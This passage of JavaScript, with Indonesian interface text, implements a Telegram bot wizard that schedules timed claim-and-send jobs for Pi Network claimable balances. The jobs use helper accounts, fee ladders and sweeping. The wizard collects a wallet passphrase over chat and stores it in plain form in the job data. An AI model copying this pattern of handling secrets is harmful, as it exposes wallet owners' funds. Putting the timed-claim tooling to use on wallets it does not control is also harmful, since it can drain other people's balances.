        "Pilih jumlah TX atau range helper.",
        "Contoh auto distribute: 1-200 = Worker1 helper 1-100 + Worker2 helper 101-200.",
    ].join("\n");
    const keyboard = { inline_keyboard: rows };
    return editQuery ? telegramEditOrSend(editQuery, text, keyboard) : telegramSend(chatId, text, keyboard);
}

async function promptNewBotPassphrase(chatId, callbackQuery = null, state = null) {
    state = state || getNewBotWizard(chatId);
    if (!state) return startNewBotWizard(chatId, callbackQuery);
    state.step = "passphrase";
    saveNewBotWizard(chatId, state);
    const text = [
        "<b>Passphrase</b>",
        "Kirim passphrase wallet claim/send.",
        "Bot akan mencoba menghapus pesan passphrase setelah diproses.",
    ].join("\n");
    return callbackQuery ? telegramEditOrSend(callbackQuery, text, newBotCancelKeyboard()) : telegramSend(chatId, text, newBotCancelKeyboard());
}

async function renderNewBotFeePicker(chatId, editQuery = null, state = null) {
    state = state || getNewBotWizard(chatId);
    if (!state) return startNewBotWizard(chatId, editQuery);
    state.step = "fee";
    saveNewBotWizard(chatId, state);
    const rows = chunkTelegramButtons(TELEGRAM_FEE_OPTIONS.map((fee) => ({
        text: `${state.data.outer_fee === fee ? "✅ " : ""}${fee}`,
        callback_data: `botnew:fee:${fee}`,
    })), 3);
    rows.push([{ text: "❌ Batal", callback_data: "botnew:cancel" }]);
    const text = "<b>Select Max Fee</b>\nPilih fee ladder.";
    const keyboard = { inline_keyboard: rows };
    return editQuery ? telegramEditOrSend(editQuery, text, keyboard) : telegramSend(chatId, text, keyboard);
}

async function renderNewBotFeePayerPicker(chatId, editQuery = null, state = null) {
    state = state || getNewBotWizard(chatId);
    if (!state) return startNewBotWizard(chatId, editQuery);
    state.step = "fee_payer";
    saveNewBotWizard(chatId, state);
    const wallets = await listWalletsWithBalances();
    const rows = wallets.slice(0, 30).map((wallet) => [{
        text: `${state.data.fee_payer_id === wallet.id ? "✅ " : ""}${wallet.name || "Funding"} (${shortKey(wallet.public_key, 4)}) - ${wallet.balance_pi || "-"} PI`,
        callback_data: `botnew:feepayer:${wallet.id}`,
    }]);
    if (!rows.length) {
        rows.push([{ text: getTelegramLanguageText("id").addFundingFirst, callback_data: "menu:funding" }]);
    }
    rows.push([{ text: "❌ Batal", callback_data: "botnew:cancel" }]);
    const text = "<b>Fee Payer Wallet</b>\nPilih funding wallet.";
    const keyboard = { inline_keyboard: rows };
    return editQuery ? telegramEditOrSend(editQuery, text, keyboard) : telegramSend(chatId, text, keyboard);
}

async function renderNewBotDestinationPicker(chatId, editQuery = null, state = null) {
    state = state || getNewBotWizard(chatId);
    if (!state) return startNewBotWizard(chatId, editQuery);
    state.step = "destination";
    saveNewBotWizard(chatId, state);
    const destinations = await listDestinations();
    const rows = destinations.slice(0, 30).map((destination) => [{
        text: `${state.data.destination === destination.address ? "✅ " : ""}${destination.name} (${shortKey(destination.address, 4)})`,
        callback_data: `botnew:dest:${destination.id}`,
    }]);
    if (!rows.length) {
        rows.push([{ text: "➕ Add Wallet Tujuan dulu", callback_data: "menu:destinations" }]);
    }
    rows.push([{ text: "❌ Batal", callback_data: "botnew:cancel" }]);
    const text = "<b>Destination Address</b>\nPilih wallet tujuan.";
    const keyboard = { inline_keyboard: rows };
    return editQuery ? telegramEditOrSend(editQuery, text, keyboard) : telegramSend(chatId, text, keyboard);
}

async function promptNewBotAmount(chatId, callbackQuery = null, state = null) {
    state = state || getNewBotWizard(chatId);
    if (!state) return startNewBotWizard(chatId, callbackQuery);
    state.step = "amount";
    saveNewBotWizard(chatId, state);
    const text = [
        "<b>Amount Send Only</b>",
        "Kirim jumlah PI khusus untuk mode Send Only.",
        "Claim dan Claim & Send tidak memakai input amount manual.",
        "Contoh: <code>1.0000000</code>",
    ].join("\n");
    return callbackQuery ? telegramEditOrSend(callbackQuery, text, newBotCancelKeyboard()) : telegramSend(chatId, text, newBotCancelKeyboard());
}

async function renderNewBotClaimableMenu(chatId, editQuery = null, state = null) {
    state = state || getNewBotWizard(chatId);
    if (!state) return startNewBotWizard(chatId, editQuery);
    state.step = "claimable_menu";
    saveNewBotWizard(chatId, state);
    const selectedIds = getSelectedClaimableIds(state.data);
    const rows = [
        [{ text: "🔎 Select Claimable", callback_data: "botnew:claim:fetch" }],
        [{ text: "✍️ Manual Balance ID", callback_data: "botnew:claim:manual" }],
    ];
    if (selectedIds.length) {
        rows.push([{ text: `✅ Lanjut (${selectedIds.length} selected)`, callback_data: "botnew:claim:done" }]);
        rows.push([{ text: "🧹 Hapus Pilihan", callback_data: "botnew:claim:clear" }]);
    }
    rows.push([{ text: "❌ Batal", callback_data: "botnew:cancel" }]);
    const autoAmount = state.data.transaction_type === "claim_and_send" ? getSelectedClaimableTotalPi(state.data) : "";
    const text = [
        "<b>Balance ID(s)</b>",
        selectedIds.length ? `Selected: <b>${selectedIds.length}</b>` : "No claimable selected.",
        state.data.transaction_type === "claim_and_send"
            ? (autoAmount ? `Amount otomatis dari claimable: <b>${autoAmount}</b> PI` : "Claim & Send: amount akan otomatis dihitung dari claimable yang dipilih.")
            : "Pilih claimable otomatis dari wallet, atau input Balance ID manual.",
    ].join("\n");
    const keyboard = { inline_keyboard: rows };
    return editQuery ? telegramEditOrSend(editQuery, text, keyboard) : telegramSend(chatId, text, keyboard);
}

async function renderNewBotClaimablePicker(chatId, editQuery = null, state = null) {
    state = state || getNewBotWizard(chatId);
    if (!state) return startNewBotWizard(chatId, editQuery);
    state.step = "claimable_picker";
    saveNewBotWizard(chatId, state);
    const cache = Array.isArray(state.data.claimable_cache) ? state.data.claimable_cache : [];
    const selected = new Set(Array.isArray(state.data.selected_claimable_indexes) ? state.data.selected_claimable_indexes : []);
    const rows = [];
    cache.slice(0, 30).forEach((balance, index) => {
        const mark = selected.has(index) ? "☑" : "☐";
        const label = `${mark} ${index + 1}. ${balance.amount || "-"} ${balance.asset || "PI"} | ${String(balance.unlock_time || "-").slice(0, 18)}`;
        rows.push([{ text: label, callback_data: `botnew:cb:${index}` }]);
    });
    if (cache.length) {
        rows.push([
            { text: "☑ Select All", callback_data: "botnew:claim:all" },
            { text: "🧹 Clear", callback_data: "botnew:claim:clear" },
        ]);
        rows.push([{ text: `✅ Pakai Pilihan (${selected.size})`, callback_data: "botnew:claim:done" }]);
    } else {
        rows.push([{ text: "Tidak ada claimable", callback_data: "noop" }]);
    }
    rows.push([{ text: "✍️ Manual ID", callback_data: "botnew:claim:manual" }, { text: "⬅️ Kembali", callback_data: "botnew:claim:menu" }]);
    rows.push([{ text: "❌ Batal", callback_data: "botnew:cancel" }]);
    const total = cache.reduce((sum, item) => sum + (Number.parseFloat(item.amount) || 0), 0);
    const text = [
        "<b>Select Claimable</b>",
        `Ditemukan: <b>${cache.length}</b> | Dipilih: <b>${selected.size}</b>`,
        `Total tampil: <b>${total.toFixed(7)}</b> PI`,
        cache.length > 30 ? "Menampilkan 30 pertama. Untuk ID lain gunakan Manual ID." : "",
    ].filter(Boolean).join("\n");
    const keyboard = { inline_keyboard: rows };
    return editQuery ? telegramEditOrSend(editQuery, text, keyboard) : telegramSend(chatId, text, keyboard);
}

async function promptNewBotManualClaimable(chatId, callbackQuery = null, state = null) {
    state = state || getNewBotWizard(chatId);
    if (!state) return startNewBotWizard(chatId, callbackQuery);
    state.step = "claimable_manual";
    saveNewBotWizard(chatId, state);
    const text = [
        "<b>Manual Balance ID(s)</b>",
        "Kirim satu atau banyak Balance ID.",
        "Bisa dipisah enter, koma, atau spasi.",
    ].join("\n");
    return callbackQuery ? telegramEditOrSend(callbackQuery, text, newBotCancelKeyboard()) : telegramSend(chatId, text, newBotCancelKeyboard());
}

async function renderNewBotUnlockPicker(chatId, editQuery = null, state = null) {
    state = state || getNewBotWizard(chatId);
    if (!state) return startNewBotWizard(chatId, editQuery);
    state.step = "unlock";
    saveNewBotWizard(chatId, state);
    const timezoneLabel = formatTimezoneOffset(state.data.user_timezone);
    const selectedUnlock = getUnlockTimeFromSelectedClaimables(state.data);
    const rows = [];
    if (selectedUnlock) {
        rows.push([{ text: `🧲 Pakai Unlock Claimable (${selectedUnlock})`, callback_data: "botnew:unlock:selected" }]);
    }
    rows.push([
        { text: "+1 Menit", callback_data: "botnew:unlock:plus:60" },
        { text: "+5 Menit", callback_data: "botnew:unlock:plus:300" },
    ]);
    rows.push([{ text: "✍️ Manual Unlock", callback_data: "botnew:unlock:manual" }]);
    rows.push([{ text: "❌ Batal", callback_data: "botnew:cancel" }]);
    const text = [
        "<b>Unlock Date / Time</b>",
        `Timezone bot: <b>${timezoneLabel}</b>`,
        state.data.unlock_time ? `Terpilih: <code>${escapeTelegramHtml(state.data.unlock_time)}</code>` : "Pilih jadwal unlock.",
    ].join("\n");
    const keyboard = { inline_keyboard: rows };
    return editQuery ? telegramEditOrSend(editQuery, text, keyboard) : telegramSend(chatId, text, keyboard);
}

async function promptNewBotManualUnlock(chatId, callbackQuery = null, state = null) {
    state = state || getNewBotWizard(chatId);
    if (!state) return startNewBotWizard(chatId, callbackQuery);
    state.step = "unlock_manual";
    saveNewBotWizard(chatId, state);
    const text = [
        "<b>Manual Unlock</b>",
        `Kirim waktu sesuai timezone <b>${formatTimezoneOffset(state.data.user_timezone)}</b>.`,
        "Format: <code>YYYY-MM-DD HH:mm:ss</code>",
        "Contoh: <code>2026-08-13 16:45:00</code>",
    ].join("\n");
    return callbackQuery ? telegramEditOrSend(callbackQuery, text, newBotCancelKeyboard()) : telegramSend(chatId, text, newBotCancelKeyboard());
}

async function renderNewBotMemoPicker(chatId, editQuery = null, state = null) {
    state = state || getNewBotWizard(chatId);
    if (!state) return startNewBotWizard(chatId, editQuery);
    state.step = "memo";
    saveNewBotWizard(chatId, state);
    const keyboard = {
        inline_keyboard: [
            [{ text: "✅ Auto memo", callback_data: "botnew:memo:auto" }],
            [{ text: "✍️ Manual memo", callback_data: "botnew:memo:manual" }],
            [{ text: "❌ Batal", callback_data: "botnew:cancel" }],
        ],
    };
    const text = [
        "<b>Auto memo</b>",
        `Saat ini: <code>${escapeTelegramHtml(state.data.custom_memo || "AUTO")}</code>`,
    ].join("\n");
    return editQuery ? telegramEditOrSend(editQuery, text, keyboard) : telegramSend(chatId, text, keyboard);
}

async function promptNewBotManualMemo(chatId, callbackQuery = null, state = null) {
    state = state || getNewBotWizard(chatId);
    if (!state) return startNewBotWizard(chatId, callbackQuery);
    state.step = "memo_manual";
    saveNewBotWizard(chatId, state);
    const text = "<b>Manual Memo</b>\nKirim memo maksimal 28 bytes.";
    return callbackQuery ? telegramEditOrSend(callbackQuery, text, newBotCancelKeyboard()) : telegramSend(chatId, text, newBotCancelKeyboard());
}

async function renderNewBotTopupPicker(chatId, editQuery = null, state = null) {
    state = state || getNewBotWizard(chatId);
    if (!state) return startNewBotWizard(chatId, editQuery);
    if (state.data.transaction_mode !== "normal") {
        state.data.topup_helpers = false;
        state.data.sweep_helpers = false;
        saveNewBotWizard(chatId, state);
        return renderNewBotReview(chatId, editQuery, state);
    }
    state.step = "topup";
    saveNewBotWizard(chatId, state);
    const keyboard = {
        inline_keyboard: [
            [
                { text: `${state.data.topup_helpers ? "✅ " : ""}Top Up ON`, callback_data: "botnew:topup:on" },
                { text: `${!state.data.topup_helpers ? "✅ " : ""}Top Up OFF`, callback_data: "botnew:topup:off" },
            ],
            [{ text: "❌ Batal", callback_data: "botnew:cancel" }],
        ],
    };
    const text = [
        "<b>Auto Top Up Helper (120s Before)</b>",
        "Aktif hanya untuk mode Normal.",
        `Target sekarang: <b>${escapeTelegramHtml(state.data.topup_target_balance)}</b> PI di atas native base 1 PI.`,
    ].join("\n");
    return editQuery ? telegramEditOrSend(editQuery, text, keyboard) : telegramSend(chatId, text, keyboard);
}

async function renderNewBotTopupTargetPicker(chatId, editQuery = null, state = null) {
    state = state || getNewBotWizard(chatId);
    if (!state) return startNewBotWizard(chatId, editQuery);
    state.step = "topup_target";
    saveNewBotWizard(chatId, state);
    const rows = chunkTelegramButtons(TELEGRAM_TOPUP_TARGET_OPTIONS.map((value) => ({
        text: `${state.data.topup_target_balance === value ? "✅ " : ""}${value}`,
        callback_data: `botnew:topuptarget:${value}`,
    })), 2);
    rows.push([{ text: "✍️ Input Manual", callback_data: "botnew:topuptarget:manual" }]);
    rows.push([{ text: "❌ Batal", callback_data: "botnew:cancel" }]);
    const text = "<b>Top Up Target</b>\nPilih saldo kerja helper di atas native base 1 PI, atau input manual.";
    const keyboard = { inline_keyboard: rows };
    return editQuery ? telegramEditOrSend(editQuery, text, keyboard) : telegramSend(chatId, text, keyboard);
}

async function renderNewBotSweepPicker(chatId, editQuery = null, state = null) {
    state = state || getNewBotWizard(chatId);
    if (!state) return startNewBotWizard(chatId, editQuery);
    state.step = "sweep";
    saveNewBotWizard(chatId, state);
    const keyboard = {
        inline_keyboard: [
            [
                { text: `${state.data.sweep_helpers ? "✅ " : ""}Sweep ON`, callback_data: "botnew:sweep:on" },
                { text: `${!state.data.sweep_helpers ? "✅ " : ""}Sweep OFF`, callback_data: "botnew:sweep:off" },
            ],
            [{ text: "❌ Batal", callback_data: "botnew:cancel" }],
        ],
    };
    const text = "<b>Auto Sweep Helper (1s After)</b>\nTarik sisa saldo helper setelah proses selesai.";
    return editQuery ? telegramEditOrSend(editQuery, text, keyboard) : telegramSend(chatId, text, keyboard);
}

function buildNewBotPayload(data) {
    const selectedClaimableIds = getSelectedClaimableIds(data);
    const payload = {
        bot_name: String(data.bot_name || "").trim(),
        worker_name: data.auto_distribute_helpers ? null : data.worker_name,
        auto_distribute_helpers: Boolean(data.auto_distribute_helpers),
        network: data.network || "mainnet",
        transaction_mode: data.transaction_mode || "fee_bump",
        helper_range: data.helper_range || "1-50",
        claimer_mnemonic: data.claimer_mnemonic,
        destination: newBotNeedsDestination(data) ? data.destination : null,
        amount: data.transaction_type === "claim_and_send" ? data.amount : (newBotNeedsManualAmount(data) ? data.amount : null),
        unlock_time: data.unlock_time,
        outer_fee: data.outer_fee || "0.04",
        fee_payer_id: data.fee_payer_id,
        claimable_balance_id: selectedClaimableIds.length ? selectedClaimableIds.join(",") : null,
        claimable_balance_ids: selectedClaimableIds,
        transaction_type: data.transaction_type,
        custom_memo: data.custom_memo || "AUTO",
        topup_helpers: data.transaction_mode === "normal" && Boolean(data.topup_helpers),
        topup_target_balance: data.topup_target_balance || "0.07",
        sweep_helpers: data.transaction_mode === "normal" && Boolean(data.sweep_helpers),
        recover_fees: false,
        recover_fee_delay: 7,
        user_timezone: normalizeUserTimezone(data.user_timezone, 0),
        username: "telegram-admin",
        created_at: utcIso(),
        status: "active",
    };
    if (!payload.bot_name) throw new Error("Name bot wajib diisi");
    if (!payload.claimer_mnemonic) throw new Error("Passphrase wajib diisi");
    if (!payload.unlock_time) throw new Error("Unlock time wajib diisi");
    if (!payload.fee_payer_id) throw new Error("Fee payer wallet wajib dipilih");
    if (newBotNeedsDestination(data) && !payload.destination) {
        throw new Error("Destination wajib diisi untuk Send / Claim & Send");
    }
    if (newBotNeedsManualAmount(data) && !payload.amount) {
        throw new Error("Amount wajib diisi untuk Send Only");
    }
    if (data.transaction_type === "claim_and_send" && !payload.amount) {
        throw new Error("Amount Claim & Send belum terdeteksi dari claimable balance");
    }
    if (newBotNeedsClaimable(data) && !selectedClaimableIds.length) {
        throw new Error("Claim / Claim & Send wajib memilih minimal 1 claimable balance");
    }
    return payload;
}

async function renderNewBotReview(chatId, editQuery = null, state = null) {
    state = state || getNewBotWizard(chatId);
    if (!state) return startNewBotWizard(chatId, editQuery);
    state.step = "review";
    saveNewBotWizard(chatId, state);
    const data = state.data;
    const selectedClaimableIds = getSelectedClaimableIds(data);
    const lines = [
        "<b>✅ Review Set New Bot</b>",
        `Type: <b>${escapeTelegramHtml(telegramTxTypeLabel(data.transaction_type))}</b>`,
        `Name: <b>${escapeTelegramHtml(data.bot_name)}</b>`,
        `Worker: <b>${escapeTelegramHtml(data.worker_label || data.worker_name || "Auto Worker")}</b>`,
        `Network: <b>${escapeTelegramHtml(String(data.network || "mainnet"))}</b>`,
        `Mode: <b>${escapeTelegramHtml(telegramTransactionModeLabel(data.transaction_mode))}</b>`,
        `Helpers: <b>${escapeTelegramHtml(data.helper_range || "-")}</b>`,
        `Claim/Send Wallet: <code>${escapeTelegramHtml(shortKey(data.claimer_public_key, 8))}</code>`,
        `Max Fee: <b>${escapeTelegramHtml(data.outer_fee || "-")}</b>`,
        `Fee Payer: <b>${escapeTelegramHtml(data.fee_payer_label || "-")}</b>`,
    ];
    if (newBotNeedsDestination(data)) {
        lines.push(`Destination: <b>${escapeTelegramHtml(data.destination_label || shortKey(data.destination, 8))}</b>`);
        if (newBotNeedsManualAmount(data)) {
            lines.push(`Amount: <b>${escapeTelegramHtml(data.amount || "-")}</b> PI`);
        } else if (data.transaction_type === "claim_and_send") {
            const detectedAmount = data.amount || getSelectedClaimableTotalPi(data);
            lines.push(`Amount: <b>${escapeTelegramHtml(detectedAmount || "auto dari claimable")}</b>${detectedAmount ? " PI" : ""}`);
        }
    }
    if (newBotNeedsClaimable(data)) {
        lines.push(`Claimable: <b>${selectedClaimableIds.length}</b> selected`);
    }
    lines.push(`Unlock: <code>${escapeTelegramHtml(data.unlock_time || "-")}</code> ${escapeTelegramHtml(formatTimezoneOffset(data.user_timezone))}`);
    lines.push(`Memo: <code>${escapeTelegramHtml(data.custom_memo || "AUTO")}</code>`);
    lines.push(`Top Up: <b>${data.transaction_mode === "normal" && data.topup_helpers ? `ON (${data.topup_target_balance})` : "OFF"}</b>`);
    lines.push(`Sweep: <b>${data.transaction_mode === "normal" && data.sweep_helpers ? "ON" : "OFF"}</b>`);
    const keyboard = {
        inline_keyboard: [
            [{ text: "🚀 Create Bot", callback_data: "botnew:create" }],
            [{ text: "🔁 Ulang dari awal", callback_data: "botnew:start" }],
            [{ text: "❌ Batal", callback_data: "botnew:cancel" }],
        ],
    };
    const text = lines.join("\n");
    return editQuery ? telegramEditOrSend(editQuery, text, keyboard) : telegramSend(chatId, text, keyboard);
}

async function createNewBotFromWizard(chatId, callbackQuery = null, state = null) {
    state = state || getNewBotWizard(chatId);
    if (!state) return startNewBotWizard(chatId, callbackQuery);
    if (state.data.transaction_type === "claim_and_send") {
        state.data.amount = await resolveClaimAndSendAmountFromClaimables(state.data);
        saveNewBotWizard(chatId, state);
    }
    const payload = buildNewBotPayload(state.data);
    if (await findBotByName(payload.bot_name)) {
        throw new Error("Bot name exists");
    }
    const botRows = await buildWorkerDistributedBots(payload);
    const newBots = await addBots(botRows);
    telegramControlState.pendingInputs.delete(String(chatId));
    const text = [
        "✅ <b>Bot TX dibuat</b>",
        `Base: <b>${escapeTelegramHtml(payload.bot_name)}</b>`,
        `Job dibuat: <b>${newBots.length}</b>`,
        newBots.length > 1 ? `Worker split: ${escapeTelegramHtml(newBots.map((bot) => `${bot.worker_name}:${bot.helper_range}`).join(" | "))}` : `Worker: ${escapeTelegramHtml(newBots[0]?.worker_name || "-")}`,
    ].join("\n");
    return callbackQuery ? telegramEditOrSend(callbackQuery, text, telegramBackKeyboard("menu:bots")) : telegramSend(chatId, text, telegramBackKeyboard("menu:bots"));
}

async function handleNewBotWizardTextInput(message, state) {
    const chatId = message.chat.id;
    let text = String(message.text || message.caption || "").trim();
    if (!text) {
        return telegramSend(chatId, "Input kosong. Silakan kirim ulang.", newBotCancelKeyboard());
    }
    try {
        if (state.step === "name") {
            if (await findBotByName(text)) {
                throw new Error("Bot name sudah ada");
            }
            state.data.bot_name = text;
            saveNewBotWizard(chatId, state);
            return renderNewBotWorkerPicker(chatId, null, state);
        }
        if (state.step === "passphrase") {
            const publicKey = derivePublicKeyFromMnemonic(text);
            state.data.claimer_mnemonic = text;
            state.data.claimer_public_key = publicKey;
            saveNewBotWizard(chatId, state);
            await telegramDeleteUserMessage(message);
            return renderNewBotFeePicker(chatId, null, state);
        }
        if (state.step === "amount") {
            if (!newBotNeedsManualAmount(state.data)) {
                throw new Error("Amount manual hanya dipakai untuk Send Only. Claim / Claim & Send memakai amount otomatis dari claimable balance.");
            }
            state.data.amount = validateTelegramPiAmount(text, "Amount");
            saveNewBotWizard(chatId, state);
            return renderNewBotUnlockPicker(chatId, null, state);
        }
        if (state.step === "claimable_manual") {
            const ids = parseTelegramClaimableIds(text);
            const maxClaimableSelection = state.data.transaction_type === "claim_and_send" ? 99 : 100;
            if (!ids.length && newBotNeedsClaimable(state.data)) {
                throw new Error("Claim / Claim & Send wajib minimal 1 Balance ID");
            }
            if (ids.length > maxClaimableSelection) {
                throw new Error(`Maksimal ${maxClaimableSelection} claimable balances per transaction`);
            }
            state.data.claimable_balance_ids = ids;
            state.data.selected_claimable_indexes = [];
            saveNewBotWizard(chatId, state);
            return renderNewBotUnlockPicker(chatId, null, state);
        }
        if (state.step === "unlock_manual") {
            state.data.unlock_time = validateTelegramUnlockTime(text);
            saveNewBotWizard(chatId, state);
            return renderNewBotMemoPicker(chatId, null, state);
        }
        if (state.step === "memo_manual") {
            if (Buffer.byteLength(text, "utf8") > 28) {
                throw new Error("Memo maksimal 28 bytes");
            }
            state.data.custom_memo = text;
            saveNewBotWizard(chatId, state);
            return renderNewBotTopupPicker(chatId, null, state);
        }
        if (state.step === "topup_target_manual") {
            state.data.topup_target_balance = validateTelegramPiAmount(text, "Top Up Target");
            saveNewBotWizard(chatId, state);
            return renderNewBotSweepPicker(chatId, null, state);
        }
    } catch (err) {
        return telegramSend(chatId, `❌ Gagal: ${escapeTelegramHtml(err.message || err)}`, newBotCancelKeyboard());
    }
    return telegramSend(chatId, "Step tidak dikenal. Ketik /cancel lalu ulangi /menu.", newBotCancelKeyboard());
}

async function handleNewBotWizardCallback(callbackQuery) {
    const data = String(callbackQuery.data || "");
    const chatId = callbackQuery.message?.chat?.id;
    let state = getNewBotWizard(chatId);

    if (data === "botnew:start") {
        return startNewBotWizard(chatId, callbackQuery);
    }
    if (data === "botnew:cancel") {
        telegramControlState.pendingInputs.delete(String(chatId));
        return telegramEditOrSend(callbackQuery, "❌ Set New Bot dibatalkan.", telegramBackKeyboard("menu:bots"));
    }
    if (!state) {
        return startNewBotWizard(chatId, callbackQuery);
    }

    if (data.startsWith("botnew:type:")) {
        const value = data.slice("botnew:type:".length);
        if (!TELEGRAM_TX_TYPE_OPTIONS.some((item) => item.value === value)) throw new Error("Type tidak valid");
        state.data.transaction_type = value;
        saveNewBotWizard(chatId, state);
        return promptNewBotName(chatId, callbackQuery, state);
    }
    if (data === "botnew:worker:auto") {
        state.data.auto_distribute_helpers = true;
        state.data.worker_name = null;
        state.data.worker_label = "Auto Worker";
        saveNewBotWizard(chatId, state);
        return renderNewBotNetworkPicker(chatId, callbackQuery, state);
    }
    if (data.startsWith("botnew:worker:")) {
        const workerId = data.slice("botnew:worker:".length);
        const worker = (await listWorkers()).find((item) => item.id === workerId);
        if (!worker) throw new Error("Worker tidak ditemukan");
        state.data.auto_distribute_helpers = false;
        state.data.worker_name = worker.name;
        state.data.worker_label = worker.name;
        saveNewBotWizard(chatId, state);
        return renderNewBotNetworkPicker(chatId, callbackQuery, state);
    }
    if (data.startsWith("botnew:network:")) {
        const value = data.slice("botnew:network:".length);
        if (!["mainnet", "testnet"].includes(value)) throw new Error("Network tidak valid");
        state.data.network = value;
        saveNewBotWizard(chatId, state);
        return renderNewBotTransactionModePicker(chatId, callbackQuery, state);
    }
    if (data.startsWith("botnew:tmode:")) {
        const value = data.slice("botnew:tmode:".length);
        if (!["fee_bump", "normal"].includes(value)) throw new Error("Mode tidak valid");
        state.data.transaction_mode = value;
        if (value === "normal") {
            state.data.topup_helpers = true;
            state.data.sweep_helpers = true;
        } else {
            state.data.topup_helpers = false;
            state.data.sweep_helpers = false;
        }
        saveNewBotWizard(chatId, state);
        return renderNewBotHelperPicker(chatId, callbackQuery, state);
    }
    if (data.startsWith("botnew:helpers:")) {
        const value = data.slice("botnew:helpers:".length);
        if (!TELEGRAM_HELPER_RANGE_OPTIONS.some((item) => item.value === value)) throw new Error("Helper range tidak valid");
        state.data.helper_range = value;
        saveNewBotWizard(chatId, state);
        return promptNewBotPassphrase(chatId, callbackQuery, state);
    }
    if (data.startsWith("botnew:fee:")) {
        const value = data.slice("botnew:fee:".length);
        if (!TELEGRAM_FEE_OPTIONS.includes(value)) throw new Error("Fee tidak valid");
        state.data.outer_fee = value;
        saveNewBotWizard(chatId, state);
        return renderNewBotFeePayerPicker(chatId, callbackQuery, state);
    }
    if (data.startsWith("botnew:feepayer:")) {
        const walletId = data.slice("botnew:feepayer:".length);
        const wallet = (await listWalletsWithBalances()).find((item) => item.id === walletId);
        if (!wallet) throw new Error("Funding wallet tidak ditemukan");
        state.data.fee_payer_id = wallet.id;
        state.data.fee_payer_label = `${wallet.name || "Funding"} (${shortKey(wallet.public_key, 6)}) - ${wallet.balance_pi || "-"} PI`;
        saveNewBotWizard(chatId, state);
        if (newBotNeedsDestination(state.data)) {
            return renderNewBotDestinationPicker(chatId, callbackQuery, state);
        }
        if (newBotNeedsClaimable(state.data)) {
            return renderNewBotClaimableMenu(chatId, callbackQuery, state);
        }
        return renderNewBotUnlockPicker(chatId, callbackQuery, state);
    }
    if (data.startsWith("botnew:dest:")) {
        const destId = data.slice("botnew:dest:".length);
        const destination = (await listDestinations()).find((item) => item.id === destId);
        if (!destination) throw new Error("Wallet tujuan tidak ditemukan");
        state.data.destination = destination.address;
        state.data.destination_label = `${destination.name} (${shortKey(destination.address, 6)})`;
        saveNewBotWizard(chatId, state);
        if (newBotNeedsManualAmount(state.data)) {
            return promptNewBotAmount(chatId, callbackQuery, state);
        }
        if (newBotNeedsClaimable(state.data)) {
            return renderNewBotClaimableMenu(chatId, callbackQuery, state);
        }
        return renderNewBotUnlockPicker(chatId, callbackQuery, state);
    }
    if (data === "botnew:claim:menu") {
        return renderNewBotClaimableMenu(chatId, callbackQuery, state);
    }
    if (data === "botnew:claim:fetch") {
        if (!state.data.claimer_public_key) throw new Error("Passphrase belum valid");
        await telegramEditOrSend(callbackQuery, "⏳ Mengambil claimable balance...", newBotCancelKeyboard());
        const claimables = await fetchClaimableBalances(state.data.claimer_public_key, state.data.network || "mainnet");
        state.data.claimable_cache = claimables;
        state.data.selected_claimable_indexes = [];
        state.data.claimable_balance_ids = [];
        saveNewBotWizard(chatId, state);
        return renderNewBotClaimablePicker(chatId, null, state);
    }
    if (data.startsWith("botnew:cb:")) {
        const index = Number.parseInt(data.slice("botnew:cb:".length), 10);
        const cache = Array.isArray(state.data.claimable_cache) ? state.data.claimable_cache : [];
        if (!Number.isSafeInteger(index) || index < 0 || index >= cache.length) throw new Error("Claimable index tidak valid");
        const selected = new Set(Array.isArray(state.data.selected_claimable_indexes) ? state.data.selected_claimable_indexes : []);
        const maxClaimableSelection = state.data.transaction_type === "claim_and_send" ? 99 : 100;
        if (selected.has(index)) {
            selected.delete(index);
        } else {
            if (selected.size >= maxClaimableSelection) throw new Error(`Maksimal ${maxClaimableSelection} claimable balances`);
            selected.add(index);
        }
        state.data.selected_claimable_indexes = [...selected].sort((a, b) => a - b);
        state.data.claimable_balance_ids = [];
        saveNewBotWizard(chatId, state);
        return renderNewBotClaimablePicker(chatId, callbackQuery, state);
    }
    if (data === "botnew:claim:all") {
        const cache = Array.isArray(state.data.claimable_cache) ? state.data.claimable_cache : [];
        const maxClaimableSelection = state.data.transaction_type === "claim_and_send" ? 99 : 100;
        state.data.selected_claimable_indexes = cache.slice(0, maxClaimableSelection).map((_, index) => index);
        state.data.claimable_balance_ids = [];
        saveNewBotWizard(chatId, state);
        return renderNewBotClaimablePicker(chatId, callbackQuery, state);
    }
    if (data === "botnew:claim:clear") {
        state.data.selected_claimable_indexes = [];
        state.data.claimable_balance_ids = [];
        saveNewBotWizard(chatId, state);
        return renderNewBotClaimableMenu(chatId, callbackQuery, state);
    }
    if (data === "botnew:claim:manual") {
        return promptNewBotManualClaimable(chatId, callbackQuery, state);
    }
    if (data === "botnew:claim:skip") {
        throw new Error("Claim & Send wajib pilih claimable balance agar amount bisa otomatis terdeteksi");
    }
    if (data === "botnew:claim:done") {
        const selectedIds = getSelectedClaimableIds(state.data);
        if (newBotNeedsClaimable(state.data) && !selectedIds.length) throw new Error("Claim / Claim & Send wajib memilih minimal 1 claimable balance");
        if (state.data.transaction_type === "claim_and_send") {
            const detectedAmount = getSelectedClaimableTotalPi(state.data);
            if (detectedAmount) {
                state.data.amount = detectedAmount;
            }
        }
        saveNewBotWizard(chatId, state);
        return renderNewBotUnlockPicker(chatId, callbackQuery, state);
    }
    if (data === "botnew:unlock:selected") {
        const selectedUnlock = getUnlockTimeFromSelectedClaimables(state.data);
        if (!selectedUnlock) throw new Error("Tidak ada unlock time valid dari claimable yang dipilih");
        state.data.unlock_time = selectedUnlock;
        saveNewBotWizard(chatId, state);
        return renderNewBotMemoPicker(chatId, callbackQuery, state);
    }
    if (data.startsWith("botnew:unlock:plus:")) {
        const seconds = Number.parseInt(data.slice("botnew:unlock:plus:".length), 10);
        if (!Number.isSafeInteger(seconds) || seconds <= 0) throw new Error("Preset unlock tidak valid");
        state.data.unlock_time = formatLocalUnlockAfterMs(seconds * 1000, state.data.user_timezone);
        saveNewBotWizard(chatId, state);
        return renderNewBotMemoPicker(chatId, callbackQuery, state);
    }
    if (data === "botnew:unlock:manual") {
        return promptNewBotManualUnlock(chatId, callbackQuery, state);
    }
    if (data === "botnew:memo:auto") {
        state.data.custom_memo = "AUTO";
        saveNewBotWizard(chatId, state);
        return renderNewBotTopupPicker(chatId, callbackQuery, state);
    }
    if (data === "botnew:memo:manual") {
        return promptNewBotManualMemo(chatId, callbackQuery, state);
    }
    if (data === "botnew:topup:on" || data === "botnew:topup:off") {
        state.data.topup_helpers = data.endsWith(":on");
        saveNewBotWizard(chatId, state);
        if (state.data.topup_helpers) {
